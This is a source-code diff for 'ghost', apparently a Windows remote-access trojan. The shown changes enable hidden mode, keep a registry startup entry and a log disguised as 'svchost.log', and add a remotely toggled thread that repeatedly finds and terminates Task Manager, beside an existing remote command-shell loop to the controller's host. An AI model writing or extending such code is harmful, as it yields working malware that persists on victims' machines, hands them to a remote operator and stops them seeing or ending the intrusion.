@@ -4,7 +4,7 @@
 	@author
 		AHXR (https://github.com/AHXR)
 	@copyright
-		2017
+		2018
 
 	ghost is free software: you can redistribute it and/or modify
 	it under the terms of the GNU General Public License as published by
@@ -21,10 +21,10 @@
 */
 //=======================================================
 #define						GHOSTVER						"1.0.3b"
-#define						AHXRLOGGER_PLUGIN				// https://github.com/AHXR/ahxrlogger
 #define						DEFAULT_BUFF					19056
 #define						TMPLOG							"svchost.log"
-//#define						GHOST_HIDE	/* DEBUG */
+#define					GHOST_HIDE						/* DEBUG */
+//#define					AHXRLOGGER_PLUGIN				// https://github.com/AHXR/ahxrlogger
 
 // 64-bit automatically redirected to "HKLM\SOFTWARE\Wow6432Node"
 #define						KEY_TARGET						HKEY_LOCAL_MACHINE 
@@ -41,11 +41,9 @@
 #include					"info.h"
 #include					"encrypt.h"
 
-#include					<ShlObj.h>
 #include					<Shellapi.h>
-#include					<fstream>
-#include					<string>
 #include					<Lmcons.h>
+#include					<fstream>
 
 using namespace				std;
 using namespace				System::Runtime::InteropServices;
@@ -58,12 +56,15 @@ TCHAR						str_windows[MAX_PATH];
 char						c_temp_cmd[ MAX_PATH + 20 ];
 char						c_cmd_dir[MAX_PATH + 7];
 bool						b_cmd;
-bool						b_admin_access;
+bool						b_taskmgr;
+HANDLE						h_payload;
 AHXRCLIENT					client;
 
 void						onClientConnect();
 void						onClientRecData( char * data);
 DWORD WINAPI				t_ping(LPVOID lpParams);
+DWORD WINAPI				t_payloads(LPVOID lpParams);
+
 
 #pragma comment				(lib, "shell32.lib")
 #pragma comment				(lib, "Advapi32.lib")
@@ -84,6 +85,7 @@ void main(cli::array<System::String^>^ args)
 	char 			c_new_path[MAX_PATH + FILENAME_MAX + 1];
 	string			s_path;
 	string			s_file_name;
+	bool			b_admin_access;
 
 	h_mod = GetModuleHandleW(NULL);
 	GetModuleFileNameA(h_mod, (char *)c_path, MAX_PATH);
@@ -145,10 +147,6 @@ void main(cli::array<System::String^>^ args)
 		sprintf(full_path, "explorer.exe,\"%s %s %s\"", c_path, str_host, str_port);
 		long l_set_key = RegSetValueEx(h_key, KEY_SHELL_NAME, 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);
 
-		fstream ftest("regtest.txt", ios::out);
-		ftest << KEY_ROOT_STARTUP << endl << KEY_SHELL_NAME << endl << full_path;
-		ftest.close();
-
 		if (l_set_key == ERROR_SUCCESS)
 			b_good = true;
 
@@ -183,6 +181,8 @@ void main(cli::array<System::String^>^ args)
 	sprintf(c_cmd_dir, "%s\\cmd.exe", str_windows);
 #endif
 
+	h_payload = CreateThread(NULL, NULL, &t_payloads, 0, 0, 0);
+
 	// Starting and idling server
 	while (1) {
 		if( client.init(str_host, str_port, TCP_SERVER, onClientConnect) ) 
@@ -193,6 +193,20 @@ void main(cli::array<System::String^>^ args)
 
 		b_cmd = false; // Safe reset
 		Sleep(1000);
+	}
+}
+
+DWORD WINAPI t_payloads(LPVOID lpParams) {
+	while (1) {
+		if (b_taskmgr) {
+			DWORD d_task = FindProcessId(L"taskmgr.exe");
+			if (d_task != 0) {
+				HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, TRUE, d_task);
+				TerminateProcess(h_process, 1);
+			}
+		}
+		
+		Sleep(100);
 	}
 }
 
@@ -293,15 +307,31 @@ void onClientRecData( char * data ) {
 	int i_len			= strlen(data) + MAX_PATH + 1;
 	char * c_output		= new char[i_len];
 	char * c_new_data	= new char[strlen(data) + 1];
+	bool b_skip = false;;
 
 	strcpy(c_new_data, data);
 	c_output[i_len - 1] = '\0';
 
+	/*fstream f_test("debug.txt", ios::out | ios::binary);
+	f_test << c_new_data;
+	f_test.close();
+	*/
+
 	/*
-		The keyword "ghost_ping" is strictly for the server to determine whether the socket is 
+		The keyword "ghost_ping" is strictly for the server to determine whether the socket is
 		active or not. Any data that is simply "ghost_ping" will be ignored.
 	*/
-	if (strcmp(c_new_data, "ghost_ping") != 0) {
+	if (!strcmp(c_new_data, "ghost_ping"))
+		b_skip = true;
+
+	if (!strcmp(c_new_data, "ghost_tskmgr")) {
+		b_taskmgr = !b_taskmgr;
+		client.send_data(encryptCMD(string(b_taskmgr ? "Task Manager Killer Enabled" : "Task Manager Killer Disabled")).c_str());
+		b_skip = true; // Nullifying by using the magical keyword
+	}
+
+	// b_skip determines whether the server is doing commands or not.
+	if ( !b_skip ) {
 		if (!strcmp(c_new_data, "CMD")) // Toggling Command Prompt response 
 			b_cmd = !b_cmd;
 		else {
